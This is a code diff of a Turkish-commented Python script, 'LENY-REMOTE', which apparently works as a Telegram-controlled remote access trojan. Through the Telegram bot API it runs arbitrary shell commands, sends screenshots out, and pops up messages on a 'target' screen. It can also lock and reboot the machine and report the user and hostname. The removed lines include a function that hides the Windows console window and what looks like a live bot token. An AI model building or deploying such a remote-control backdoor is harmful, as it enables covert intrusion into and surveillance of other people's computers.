@@ -4,6 +4,8 @@ import subprocess
 import time
 import requests
 import ctypes
+import getpass
+import threading
 from io import BytesIO
 
 try:
@@ -13,20 +15,8 @@ except ImportError:
     HAS_GUI = False
 
 # --- ÖZEL YAPILANDIRMA ---
-TOKEN = "8933706623:AAF-UGKiWryqr4RNXhlY-2s6mpNtvI5W2qU"
-AUTHORIZED_USER_ID = 8201682688  # Kendi Telegram User ID'ni buraya yaz (Güvenlik kilidi)
-
-def hide_console():
-    """Windows'ta siyah CMD penceresini tamamen gizler (Tam Hayalet Modu)"""
-    if os.name == 'nt':
-        try:
-            kernel32 = ctypes.WinDLL('kernel32')
-            user32 = ctypes.WinDLL('user32')
-            hWnd = kernel32.GetConsoleWindow()
-            if hWnd:
-                user32.ShowWindow(hWnd, 0) # 0 = SW_HIDE
-        except:
-            pass
+TOKEN = "BURAYA_TELEGRAM_BOT_TOKENINI_YAZ"
+AUTHORIZED_USER_ID = 123456789  # Kendi Telegram User ID'ni buraya yaz
 
 def send_message(chat_id, text):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
@@ -51,10 +41,12 @@ def handle_command(text, chat_id):
     if text == "/start" or text.lower() == "menu":
         msg = (
             "🛡️ *LENY-REMOTE KONTROL MERKEZİ* 🛡️\n\n"
-            "Sistem aktif ve komut bekliyor:\n"
+            "Sistem aktif ve operasyona hazır:\n"
             "• `/screenshot` - Anlık ekran görüntüsü al\n"
-            "• `/cmd <komut>` - Uzaktan CMD/Shell komutu çalıştır\n"
+            "• `/cmd <komut>` - Uzaktan Shell komutu çalıştır\n"
+            "• `/msg <mesaj>` - Hedef ekrana pop-up uyarı kutusu fırlat\n"
             "• `/lock` - Bilgisayarı anında kilitle\n"
+            "• `/reboot` - Sistemi yeniden başlat\n"
             "• `/sysinfo` - Sistem durumunu göster\n"
         )
         send_message(chat_id, msg)
@@ -62,7 +54,6 @@ def handle_command(text, chat_id):
     elif text == "/screenshot":
         if HAS_GUI:
             try:
-                # Görüntüyü diske yazmadan doğrudan RAM'de tutuyoruz
                 screenshot = pyautogui.screenshot()
                 bio = BytesIO()
                 screenshot.save(bio, format='PNG')
@@ -76,28 +67,54 @@ def handle_command(text, chat_id):
     elif text.startswith("/cmd "):
         cmd = text[5:].strip()
         try:
-            # Komutu çalıştır ve çıktıyı yakala
             output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=15)
             result = output.decode('utf-8', errors='ignore')
             if len(result) > 4000:
                 result = result[:3996] + "\n..."
             if not result.strip():
                 result = "[✔] Komut başarıyla yürütüldü (Geri dönüş çıktısı yok)."
-            send_message(chat_id, f"💻 *Komut Çıktısı:*\n```\n{result}\n```")
+            send_message(chat_id, f"💻 *Komut Çıktısı*:\n```\n{result}\n```")
         except Exception as e:
             send_message(chat_id, f"❌ Komut yürütme hatası: {str(e)}")
+
+    elif text.startswith("/msg "):
+        msg_content = text[5:].strip()
+        if HAS_GUI:
+            try:
+                # Arka planda ana akışı dondurmadan ekrana pop-up mesaj kutusu fırlatır
+                def show_alert():
+                    pyautogui.alert(text=msg_content, title="LENY-REMOTE SYSTEM NOTICE")
+                threading.Thread(target=show_alert).start()
+                send_message(chat_id, f"💬 *Başarılı:* Hedef ekrana mesaj fırlatıldı: `{msg_content}`")
+            except Exception as e:
+                send_message(chat_id, f"❌ Mesaj gösterilemedi: {str(e)}")
+        else:
+            send_message(chat_id, "❌ GUI kütüphanesi aktif değil.")
             
     elif text == "/lock":
-        if os.name == 'nt':
-            ctypes.windll.user32.LockWorkStation()
+        try:
+            if os.name == 'nt':
+                ctypes.windll.user32.LockWorkStation()
+            else:
+                subprocess.run(["loginctl", "lock-session"], check=False)
             send_message(chat_id, "🔒 Bilgisayar kilitlendi.")
-        else:
-            send_message(chat_id, "❌ Bu özellik sadece Windows'ta çalışır.")
+        except Exception as e:
+            send_message(chat_id, f"❌ Kilitleme hatası: {str(e)}")
+
+    elif text == "/reboot":
+        try:
+            send_message(chat_id, "🔄 Sistem yeniden başlatılıyor...")
+            if os.name == 'nt':
+                os.system("shutdown /r /t 1")
+            else:
+                os.system("sudo reboot")
+        except Exception as e:
+            send_message(chat_id, f"❌ Yeniden başlatma hatası: {str(e)}")
             
     elif text == "/sysinfo":
         try:
-            user = os.getlogin()
-            hostname = os.environ.get('COMPUTERNAME', 'Bilinmiyor')
+            user = getpass.getuser()
+            hostname = os.environ.get('HOSTNAME', os.environ.get('COMPUTERNAME', 'Bilinmiyor'))
             os_info = sys.platform
             info = f"💻 *Sistem Durumu*\n• Kullanıcı: `{user}`\n• Makine: `{hostname}`\n• Platform: `{os_info}`"
             send_message(chat_id, info)
@@ -108,9 +125,6 @@ def handle_command(text, chat_id):
         send_message(chat_id, "❓ Geçersiz komut. Menü için `/start` yaz.")
 
 def main_loop():
-    # Konsolu tamamen gizle (Arka planda sessizce çalışır)
-    hide_console()
-    
     offset = 0
     while True:
         try:
@@ -126,14 +140,11 @@ def main_loop():
                         user_id = message["from"]["id"]
                         text = message.get("text", "")
                         
-                        # --- GÜVENLİK DUVARI ---
-                        # Sadece senin ID'n komut verebilir. Başkası yazarsa engellenir.
                         if user_id == AUTHORIZED_USER_ID:
                             handle_command(text, chat_id)
                         else:
                             send_message(chat_id, "⛔ Bu sistemi kontrol etme yetkin yok.")
         except Exception:
-            # İnternet kopması veya Telegram timeout durumunda çökmez, 5 saniye bekleyip tekrar dener
             time.sleep(5)
 
 if __name__ == "__main__":
